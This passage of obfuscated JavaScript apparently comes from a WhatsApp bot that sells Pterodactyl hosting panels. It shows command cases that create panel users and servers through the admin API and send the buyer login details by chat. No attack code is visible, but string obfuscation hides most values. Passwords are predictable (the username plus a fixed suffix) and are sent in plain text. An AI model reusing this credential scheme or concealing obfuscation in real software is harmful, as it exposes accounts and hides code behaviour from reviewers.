              'id': _0x597c(721)
            }]
          }];
          let _0x3c61d2 = {
            'title': _0x597c(364),
            'sections': _0x1165bc
          };
          let _0x3599ec = generateWAMessageFromContent(_0x432e1b[_0x597c(805)], {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': _0x1609a1,
                'interactiveMessage': proto[_0x597c(414)][_0x597c(367)][_0x597c(419)]({
                  'contextInfo': {
                    'mentionedJid': [_0x432e1b.sender],
                    'externalAdrzxReply': _0x37b9d0
                  },
                  'body': proto[_0x597c(414)][_0x597c(367)][_0x597c(400)][_0x597c(419)]({
                    'text': _0x273541
                  }),
                  'footer': proto[_0x597c(414)][_0x597c(367)][_0x597c(475)][_0x597c(419)](_0x1e6b18),
                  'header': proto[_0x597c(414)][_0x597c(367)].Header.create({
                    'hasMediaAttachment': true,
                    ...(await prepareWAMessageMedia({
                      'image': await fs[_0x597c(481)]("./Media/Menu.jpg")
                    }, {
                      'upload': _0x5051a5.waUploadToServer
                    }))
                  }),
                  'nativeFlowMessage': proto[_0x597c(414)][_0x597c(367)][_0x597c(891)][_0x597c(419)]({
                    'buttons': [{
                      'name': "single_select",
                      'buttonParamsJson': JSON[_0x597c(554)](_0x3c61d2)
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': _0x597c(822)
                    }]
                  })
                })
              }
            }
          }, {
            'userJid': _0x432e1b[_0x597c(467)],
            'quoted': _0x432e1b
          });
          await _0x5051a5[_0x597c(373)](_0x3599ec[_0x597c(526)][_0x597c(670)], _0x3599ec.message, {
            'messageId': _0x3599ec[_0x597c(526)].id
          });
        }
        break;
      case 'ai':
        {
          if (_0x46e001[0] === _0x597c(483)) {
            if (db[_0x597c(777)].chats[_0x432e1b[_0x597c(805)]][_0x597c(885)]) {
              return _0x3652ad("activated");
            }
            db.data[_0x597c(828)][_0x432e1b[_0x597c(805)]][_0x597c(885)] = true;
            _0x3652ad(_0x597c(585));
          } else {
            if (_0x46e001[0] === _0x597c(405)) {
              if (!db[_0x597c(777)].chats[_0x432e1b[_0x597c(805)]][_0x597c(885)]) {
                return _0x3652ad(_0x597c(708));
              }
              db[_0x597c(777)][_0x597c(828)][_0x432e1b[_0x597c(805)]].rzx = false;
              _0x3652ad("Successfully Disabling Auto Chat ");
            } else {
              _0x3652ad(_0x49f20b + _0x4af652 + _0x597c(593) + (_0x49f20b + _0x4af652) + _0x597c(451));
            }
          }
        }
        break;
      case _0x597c(602):
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(456)]);
          }
          let _0x23d042 = _0x4d0552[_0x597c(613)](',');
          if (_0x23d042[_0x597c(625)] < 2) {
            return _0x432e1b[_0x597c(395)]("*Format salah!*\nPenggunaan:\n" + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          let _0x58ad6c = _0x23d042[0];
          let _0x376f50 = _0x432e1b.quoted ? _0x432e1b[_0x597c(488)][_0x597c(467)] : _0x23d042[1] ? _0x23d042[1][_0x597c(729)](/[^0-9]/g, '') + _0x597c(981) : _0x432e1b[_0x597c(836)][0];
          let _0x5ae9a9 = _0x58ad6c + _0x597c(679);
          let _0x15e1ff = global[_0x597c(886)];
          let _0x5607b3 = global[_0x597c(544)];
          let _0x3994fa = _0x597c(658);
          let _0x9f40e2 = _0x58ad6c + _0x597c(589);
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x376f50) {
            return;
          }
          let _0x5b0268 = _0x58ad6c + "001";
          let _0x342459 = await fetch(domain + _0x597c(722), {
            'method': 'POST',
            'headers': {
              'Accept': _0x597c(599),
              'Content-TyPe': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON.stringify({
              'email': _0x9f40e2,
              'username': _0x58ad6c,
              'first_name': _0x58ad6c,
              'last_name': _0x58ad6c,
              'language': 'en',
              'password': _0x5b0268
            })
          });
          let _0xd73213 = await _0x342459.json();
          if (_0xd73213.errors) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0xd73213[_0x597c(915)][0], null, 2));
          }
          let _0x2e70d5 = _0xd73213.attributes;
          let _0x1ceb2b = await fetch(domain + _0x597c(767) + _0x15e1ff, {
            'method': _0x597c(674),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0xc717ad = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)](_0x597c(346) + _0x2e70d5.id);
          ctf = "Hai @" + _0x376f50[_0x597c(613)]`@`[0] + _0x597c(469) + _0x2e70d5[_0x597c(632)] + _0x597c(695) + _0x5b0268 + _0x597c(442) + domain + "\n\nNOTE :\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801\n";
          _0x5051a5.sendMessage(_0x376f50, {
            'image': _0xc717ad,
            'caption': ctf
          }, {
            'quoted': _0x5051a5[_0x597c(805)]
          });
          const _0x76ed51 = {
            memory: '1024',
            swap: 0x0,
            disk: _0x3994fa,
            io: 0x1f4,
            cpu: '30'
          };
          const _0x1b596c = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x16e0b1 = await _0x1ceb2b[_0x597c(487)]();
          let _0x29ee9f = _0x16e0b1.attributes[_0x597c(807)];
          let _0x68ca6a = await fetch(domain + "/api/application/servers", {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            },
            'body': JSON[_0x597c(554)]({
              'name': _0x5ae9a9,
              'description': "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x2e70d5.id,
              'egg': parseInt(_0x15e1ff),
              'docker_image': _0x597c(911),
              'startup': _0x29ee9f,
              'environment': {
                'INST': _0x597c(521),
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': _0x76ed51,
              'feature_limits': _0x1b596c,
              'deploy': {
                'locations': [parseInt(_0x5607b3)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x4c55b3 = await _0x68ca6a[_0x597c(487)]();
          if (_0x4c55b3.errors) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x4c55b3[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case _0x597c(820):
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(456)]);
          }
          let _0x4331f8 = _0x4d0552[_0x597c(613)](',');
          if (_0x4331f8[_0x597c(625)] < 2) {
            return _0x432e1b[_0x597c(395)]("*Format salah!*\nPenggunaan:\n" + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          let _0x533af8 = _0x4331f8[0];
          let _0x4327c2 = _0x432e1b[_0x597c(488)] ? _0x432e1b[_0x597c(488)][_0x597c(467)] : _0x4331f8[1] ? _0x4331f8[1][_0x597c(729)](/[^0-9]/g, '') + _0x597c(981) : _0x432e1b[_0x597c(836)][0];
          let _0x13ef9a = _0x533af8 + _0x597c(601);
          let _0x16f90c = global[_0x597c(886)];
          let _0x11f587 = global.location;
          let _0x192d04 = _0x597c(956);
          let _0x6fcc92 = _0x597c(956);
          let _0x2a82be = _0x533af8 + _0x597c(589);
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x4327c2) {
            return;
          }
          let _0x37378f = _0x533af8 + _0x597c(967);
          let _0x2e30c5 = await fetch(domain + _0x597c(722), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'email': _0x2a82be,
              'username': _0x533af8,
              'first_name': _0x533af8,
              'last_name': _0x533af8,
              'language': 'en',
              'password': _0x37378f
            })
          });
          let _0x16c935 = await _0x2e30c5.json();
          if (_0x16c935[_0x597c(915)]) {
            return _0x432e1b.rzxReply(JSON[_0x597c(554)](_0x16c935.errors[0], null, 2));
          }
          let _0x159cda = _0x16c935[_0x597c(740)];
          let _0x53bd96 = await fetch(domain + _0x597c(767) + _0x16f90c, {
            'method': _0x597c(674),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0x3bfdf0 = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)](_0x597c(346) + _0x159cda.id);
          ctf = "Hai @" + _0x4327c2[_0x597c(613)]`@`[0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x159cda[_0x597c(632)] + _0x597c(652) + _0x37378f + _0x597c(782) + domain + _0x597c(415);
          _0x5051a5[_0x597c(937)](_0x4327c2, {
            'image': _0x3bfdf0,
            'caption': ctf
          }, {
            'quoted': _0x5051a5[_0x597c(805)]
          });
          const _0x2c3b43 = {
            memory: _0x192d04,
            swap: 0x0,
            disk: _0x6fcc92,
            io: 0x1f4,
            cpu: '60'
          };
          const _0x570187 = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x4522f1 = await _0x53bd96[_0x597c(487)]();
          let _0xbdfd4a = _0x4522f1[_0x597c(740)].startup;
          let _0x436218 = await fetch(domain + _0x597c(474), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            },
            'body': JSON[_0x597c(554)]({
              'name': _0x13ef9a,
              'description': "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x159cda.id,
              'egg': parseInt(_0x16f90c),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0xbdfd4a,
              'environment': {
                'INST': _0x597c(521),
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': _0x597c(396)
              },
              'limits': _0x2c3b43,
              'feature_limits': _0x570187,
              'deploy': {
                'locations': [parseInt(_0x11f587)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0xe717ec = await _0x436218[_0x597c(487)]();
          if (_0xe717ec[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0xe717ec.errors[0], null, 2));
          }
        }
        break;
      case _0x597c(800):
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess.only[_0x597c(456)]);
          }
          let _0x720d42 = _0x4d0552[_0x597c(613)](',');
          if (_0x720d42[_0x597c(625)] < 2) {
            return _0x432e1b[_0x597c(395)](_0x597c(988) + (_0x49f20b + _0x4af652) + " user,nomer");
          }
          let _0x4a9ea0 = _0x720d42[0];
          let _0x17427d = _0x432e1b[_0x597c(488)] ? _0x432e1b[_0x597c(488)][_0x597c(467)] : _0x720d42[1] ? _0x720d42[1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x432e1b[_0x597c(836)][0];
          let _0x201f8f = _0x4a9ea0 + _0x597c(756);
          let _0x3a8138 = global[_0x597c(886)];
          let _0x48cb73 = global.location;
          let _0x7aeb0d = _0x597c(689);
          let _0x3d9d8b = _0x597c(689);
          let _0x1eea38 = _0x4a9ea0 + _0x597c(589);
          akunlo = _0x597c(916);
          if (!_0x17427d) {
            return;
          }
          let _0xb0b64a = _0x4a9ea0 + _0x597c(967);
          let _0x55c463 = await fetch(domain + _0x597c(722), {
            'method': "POST",
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON.stringify({
              'email': _0x1eea38,
              'username': _0x4a9ea0,
              'first_name': _0x4a9ea0,
              'last_name': _0x4a9ea0,
              'language': 'en',
              'password': _0xb0b64a
            })
          });
          let _0x9dcff0 = await _0x55c463.json();
          if (_0x9dcff0[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x9dcff0[_0x597c(915)][0], null, 2));
          }
          let _0x7e50ab = _0x9dcff0[_0x597c(740)];
          let _0x55513b = await fetch(domain + "/api/application/nests/5/eggs/" + _0x3a8138, {
            'method': _0x597c(674),
            'headers': {
              'Accept': "application/json",
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0x4013fd = {
            url: akunlo
          };
          _0x432e1b.rzxReply(_0x597c(346) + _0x7e50ab.id);
          ctf = _0x597c(854) + _0x17427d[_0x597c(613)]`@`[0] + _0x597c(1006) + _0x7e50ab[_0x597c(632)] + "\n⎙─➤ *🔐PASSWORD* : " + _0xb0b64a + _0x597c(782) + domain + _0x597c(661);
          _0x5051a5[_0x597c(937)](_0x17427d, {
            'image': _0x4013fd,
            'caption': ctf
          }, {
            'quoted': _0x5051a5[_0x597c(805)]
          });
          const _0xa7c56d = {
            memory: _0x7aeb0d,
            swap: 0x0,
            disk: _0x3d9d8b,
            io: 0x1f4,
            cpu: '80'
          };
          const _0x49b0dc = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x2d6b18 = await _0x55513b[_0x597c(487)]();
          let _0x25f4dc = _0x2d6b18[_0x597c(740)][_0x597c(807)];
          let _0x1d7557 = await fetch(domain + _0x597c(474), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'name': _0x201f8f,
              'description': _0x597c(784),
              'user': _0x7e50ab.id,
              'egg': parseInt(_0x3a8138),
              'docker_image': _0x597c(911),
              'startup': _0x25f4dc,
              'environment': {
                'INST': _0x597c(521),
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': _0x597c(396)
              },
              'limits': _0xa7c56d,
              'feature_limits': _0x49b0dc,
              'deploy': {
                'locations': [parseInt(_0x48cb73)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0xcf85a0 = await _0x1d7557[_0x597c(487)]();
          if (_0xcf85a0[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0xcf85a0[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case "4gb":
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(456)]);
          }
          let _0x18db86 = _0x4d0552[_0x597c(613)](',');
          if (_0x18db86[_0x597c(625)] < 2) {
            return _0x432e1b[_0x597c(395)](_0x597c(988) + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          let _0x202e7b = _0x18db86[0];
          let _0x531792 = _0x432e1b[_0x597c(488)] ? _0x432e1b[_0x597c(488)][_0x597c(467)] : _0x18db86[1] ? _0x18db86[1][_0x597c(729)](/[^0-9]/g, '') + _0x597c(981) : _0x432e1b[_0x597c(836)][0];
          let _0x90c298 = _0x202e7b + '4';
          let _0x20b2b1 = global[_0x597c(886)];
          let _0x47f36e = global[_0x597c(544)];
          let _0x3c4d17 = _0x597c(865);
          let _0x778d1d = _0x597c(803);
          let _0x43598d = _0x202e7b + _0x597c(589);
          akunlo = _0x597c(916);
          if (!_0x531792) {
            return;
          }
          let _0x3fdc25 = _0x202e7b + "001";
          let _0x54ec43 = await fetch(domain + _0x597c(722), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'email': _0x43598d,
              'username': _0x202e7b,
              'first_name': _0x202e7b,
              'last_name': _0x202e7b,
              'language': 'en',
              'password': _0x3fdc25
            })
          });
          let _0xbac764 = await _0x54ec43.json();
          if (_0xbac764[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON.stringify(_0xbac764[_0x597c(915)][0], null, 2));
          }
          let _0x4f395b = _0xbac764[_0x597c(740)];
          let _0xf1982a = await fetch(domain + _0x597c(767) + _0x20b2b1, {
            'method': "GET",
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0x2d7166 = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)](_0x597c(346) + _0x4f395b.id);
          ctf = _0x597c(854) + _0x531792[_0x597c(613)]`@`[0] + _0x597c(1006) + _0x4f395b[_0x597c(632)] + "\n⎙─➤ *🔐PASSWORD* : " + _0x3fdc25 + "\n⎙─➤ *🌐LOGIN* : " + domain + _0x597c(985);
          _0x5051a5.sendMessage(_0x531792, {
            'image': _0x2d7166,
            'caption': ctf
          }, {
            'quoted': _0x5051a5[_0x597c(805)]
          });
          const _0x2218f7 = {
            memory: _0x3c4d17,
            swap: 0x0,
            disk: _0x778d1d,
            io: 0x1f4,
            cpu: "100"
          };
          const _0x287ee8 = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x10a297 = await _0xf1982a[_0x597c(487)]();
          let _0x44cb22 = _0x10a297[_0x597c(740)][_0x597c(807)];
          let _0x3ccb2d = await fetch(domain + "/api/application/servers", {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': "application/json",
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON.stringify({
              'name': _0x90c298,
              'description': "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x4f395b.id,
              'egg': parseInt(_0x20b2b1),
              'docker_image': _0x597c(911),
              'startup': _0x44cb22,
              'environment': {
                'INST': _0x597c(521),
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': _0x597c(396)
              },
              'limits': _0x2218f7,
              'feature_limits': _0x287ee8,
              'deploy': {
                'locations': [parseInt(_0x47f36e)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x189207 = await _0x3ccb2d[_0x597c(487)]();
          if (_0x189207.errors) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x189207[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case _0x597c(604):
        {
          if (!_0x18271c) {
            return _0x3652ad(_0x597c(730));
          }
          let _0x25d1d1 = _0x4d0552.split(',');
          if (_0x25d1d1.length < 2) {
            return _0x432e1b.rzxReply(_0x597c(988) + (_0x49f20b + _0x4af652) + " user,nomer");
          }
          let _0x3ae954 = _0x25d1d1[0];
          let _0x1309de = _0x432e1b[_0x597c(488)] ? _0x432e1b[_0x597c(488)].sender : _0x25d1d1[1] ? _0x25d1d1[1][_0x597c(729)](/[^0-9]/g, '') + "@s.whatsapp.net" : _0x432e1b[_0x597c(836)][0];
          let _0x32561f = _0x3ae954 + _0x597c(793);
          let _0x5d8309 = global[_0x597c(886)];
          let _0x456be2 = global.location;
          let _0x523249 = _0x3ae954 + "1398@gmail.com";
          akunlo = _0x597c(916);
          if (!_0x1309de) {
            return;
          }
          let _0x47d0ff = _0x3ae954 + _0x597c(967);
          let _0x1e676f = await fetch(domain + _0x597c(722), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': "application/json",
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON.stringify({
              'email': _0x523249,
              'username': _0x3ae954,
              'first_name': _0x3ae954,
              'last_name': _0x3ae954,
              'language': 'en',
              'password': _0x47d0ff
            })
          });
          let _0x213ee4 = await _0x1e676f[_0x597c(487)]();
          if (_0x213ee4[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON.stringify(_0x213ee4[_0x597c(915)][0], null, 2));
          }
          let _0x406f77 = _0x213ee4.attributes;
          let _0x57271d = await fetch(domain + _0x597c(767) + _0x5d8309, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0x344e07 = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)](_0x597c(346) + _0x406f77.id);
          ctf = "Hai @" + _0x1309de[_0x597c(613)]`@`[0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x406f77.username + _0x597c(652) + _0x47d0ff + _0x597c(782) + domain + _0x597c(985);
          _0x5051a5[_0x597c(937)](_0x1309de, {
            'image': _0x344e07,
            'caption': ctf
          }, {
            'quoted': _0x5051a5[_0x597c(805)]
          });
          const _0x40c469 = {
            memory: '0',
            swap: 0x0,
            disk: '0',
            io: 0x1f4,
            cpu: '0'
          };
          const _0x649db2 = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x3700f4 = await _0x57271d[_0x597c(487)]();
          let _0x98cd0e = _0x3700f4.attributes[_0x597c(807)];
          let _0x37849d = await fetch(domain + _0x597c(474), {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            },
            'body': JSON[_0x597c(554)]({
              'name': _0x32561f,
              'description': "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x406f77.id,
              'egg': parseInt(_0x5d8309),
              'docker_image': _0x597c(911),
              'startup': _0x98cd0e,
              'environment': {
                'INST': _0x597c(521),
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': _0x597c(396)
              },
              'limits': _0x40c469,
              'feature_limits': _0x649db2,
              'deploy': {
                'locations': [parseInt(_0x456be2)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x51a0ce = await _0x37849d[_0x597c(487)]();
          if (_0x51a0ce.errors) {
            return _0x432e1b.rzxReply(JSON[_0x597c(554)](_0x51a0ce[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case _0x597c(737):
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)][_0x597c(456)]);
          }
          let _0x4a5ee4 = _0x4d0552[_0x597c(613)](',');
          if (_0x4a5ee4[_0x597c(625)] < 2) {
            return _0x432e1b[_0x597c(395)](_0x597c(988) + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          let _0x384a83 = _0x4a5ee4[0];
          let _0x38f16b = _0x432e1b[_0x597c(488)] ? _0x432e1b.quoted[_0x597c(467)] : _0x4a5ee4[1] ? _0x4a5ee4[1][_0x597c(729)](/[^0-9]/g, '') + "@s.whatsapp.net" : _0x432e1b[_0x597c(836)][0];
          let _0x1afe70 = _0x384a83 + _0x597c(546);
          let _0x365c1b = global[_0x597c(886)];
          let _0x230aca = global.location;
          let _0x48149e = _0x597c(744);
          let _0x1142db = _0x597c(608);
          let _0x32ed5d = _0x384a83 + _0x597c(589);
          akunlo = _0x597c(916);
          if (!_0x38f16b) {
            return;
          }
          let _0x594703 = _0x384a83 + _0x597c(377);
          let _0x2139c1 = await fetch(domain + _0x597c(722), {
            'method': _0x597c(970),
            'headers': {
              'Accept': "application/json",
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            },
            'body': JSON[_0x597c(554)]({
              'email': _0x32ed5d,
              'username': _0x384a83,
              'first_name': _0x384a83,
              'last_name': _0x384a83,
              'language': 'en',
              'password': _0x594703
            })
          });
          let _0x398053 = await _0x2139c1[_0x597c(487)]();
          if (_0x398053.errors) {
            return _0x432e1b[_0x597c(395)](JSON.stringify(_0x398053.errors[0], null, 2));
          }
          let _0x454cd9 = _0x398053[_0x597c(740)];
          let _0x1e1baa = await fetch(domain + _0x597c(767) + _0x365c1b, {
            'method': _0x597c(674),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': "application/json",
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0x34e466 = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)]("SUCCES CREATE USER ID: " + _0x454cd9.id);
          ctf = "Hai @" + _0x38f16b[_0x597c(613)]`@`[0] + _0x597c(1006) + _0x454cd9.username + _0x597c(652) + _0x594703 + _0x597c(782) + domain + _0x597c(985);
          _0x5051a5[_0x597c(937)](_0x38f16b, {
            'image': _0x34e466,
            'caption': ctf
          }, {
            'quoted': _0x5051a5.chat
          });
          const _0x5f3a2f = {
            memory: '5138',
            swap: 0x0,
            disk: _0x1142db,
            io: 0x1f4,
            cpu: _0x48149e
          };
          const _0x208649 = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x2399f4 = await _0x1e1baa.json();
          let _0x2351b4 = _0x2399f4.attributes[_0x597c(807)];
          let _0x4f2da3 = await fetch(domain + _0x597c(474), {
            'method': _0x597c(970),
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON[_0x597c(554)]({
              'name': _0x1afe70,
              'description': _0x597c(784),
              'user': _0x454cd9.id,
              'egg': parseInt(_0x365c1b),
              'docker_image': _0x597c(911),
              'startup': _0x2351b4,
              'environment': {
                'INST': 'npm',
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': _0x5f3a2f,
              'feature_limits': _0x208649,
              'deploy': {
                'locations': [parseInt(_0x230aca)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x5889ec = await _0x4f2da3[_0x597c(487)]();
          if (_0x5889ec[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x5889ec[_0x597c(915)][0], null, 2));
          }
        }
        break;
      case _0x597c(650):
        {
          if (!_0x403967 && !_0x18271c) {
            return _0x3652ad(mess[_0x597c(842)].premium);
          }
          let _0x5a4793 = _0x4d0552.split(',');
          if (_0x5a4793.length < 2) {
            return _0x432e1b[_0x597c(395)]("*Format salah!*\nPenggunaan:\n" + (_0x49f20b + _0x4af652) + _0x597c(929));
          }
          let _0x1f5306 = _0x5a4793[0];
          let _0x3b6c7c = _0x432e1b.quoted ? _0x432e1b[_0x597c(488)].sender : _0x5a4793[1] ? _0x5a4793[1][_0x597c(729)](/[^0-9]/g, '') + _0x597c(981) : _0x432e1b[_0x597c(836)][0];
          let _0x1cd331 = _0x1f5306 + _0x597c(627);
          let _0x5e9674 = global[_0x597c(886)];
          let _0x48d984 = global[_0x597c(544)];
          let _0x2c9d11 = _0x597c(850);
          let _0x10305c = _0x597c(691);
          let _0x4158e3 = _0x597c(850);
          let _0x269741 = _0x1f5306 + _0x597c(589);
          akunlo = _0x597c(916);
          if (!_0x3b6c7c) {
            return;
          }
          let _0xcc1bf3 = _0x1f5306 + _0x597c(377);
          let _0x4e97de = await fetch(domain + _0x597c(722), {
            'method': _0x597c(970),
            'headers': {
              'Accept': "application/json",
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            },
            'body': JSON[_0x597c(554)]({
              'email': _0x269741,
              'username': _0x1f5306,
              'first_name': _0x1f5306,
              'last_name': _0x1f5306,
              'language': 'en',
              'password': _0xcc1bf3
            })
          });
          let _0x31a6eb = await _0x4e97de[_0x597c(487)]();
          if (_0x31a6eb[_0x597c(915)]) {
            return _0x432e1b[_0x597c(395)](JSON[_0x597c(554)](_0x31a6eb[_0x597c(915)][0], null, 2));
          }
          let _0x23ccaa = _0x31a6eb[_0x597c(740)];
          let _0x236762 = await fetch(domain + _0x597c(767) + _0x5e9674, {
            'method': _0x597c(674),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': _0x597c(792) + apikey
            }
          });
          const _0x5e9d22 = {
            url: akunlo
          };
          _0x432e1b[_0x597c(395)]("SUCCES CREATE USER ID: " + _0x23ccaa.id);
          ctf = _0x597c(854) + _0x3b6c7c[_0x597c(613)]`@`[0] + _0x597c(1006) + _0x23ccaa.username + _0x597c(652) + _0xcc1bf3 + _0x597c(782) + domain + _0x597c(985);
          _0x5051a5[_0x597c(937)](_0x3b6c7c, {
            'image': _0x5e9d22,
            'caption': ctf
          }, {
            'quoted': _0x5051a5.chat
          });
          const _0x2a7213 = {
            memory: _0x2c9d11,
            swap: 0x0,
            disk: _0x4158e3,
            io: 0x1f4,
            cpu: _0x10305c
          };
          const _0xc9cbe8 = {
            databases: 0x5,
            backups: 0x5,
            allocations: 0x1
          };
          let _0x27e17b = await _0x236762[_0x597c(487)]();
          let _0x45f3b2 = _0x27e17b.attributes.startup;
          let _0x467914 = await fetch(domain + "/api/application/servers", {
            'method': _0x597c(970),
            'headers': {
              'Accept': _0x597c(599),
              'Content-Type': _0x597c(599),
              'Authorization': "Bearer " + apikey
            },
            'body': JSON[_0x597c(554)]({
              'name': _0x1cd331,
              'description': "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x23ccaa.id,
              'egg': parseInt(_0x5e9674),
              'docker_image': _0x597c(911),
              'startup': _0x45f3b2,
              'environment': {
                'INST': _0x597c(521),
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
